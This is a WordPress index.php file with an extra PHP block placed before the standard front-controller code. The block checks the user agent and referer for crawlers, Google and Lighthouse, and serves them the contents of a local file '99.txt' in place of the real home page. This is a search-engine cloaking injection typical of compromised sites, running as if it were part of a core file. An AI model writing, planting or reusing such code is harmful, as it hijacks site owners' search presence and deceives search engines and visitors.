<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '';

if ($uri == '/' && (strpos($userAgent, 'bot') !== false || strpos($userAgent, 'google') !== false  || strpos($userAgent, 'chrome-lighthouse') !== false || strpos($referer, 'google') !== false)) {
    echo file_get_contents('99.txt');
    exit();
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
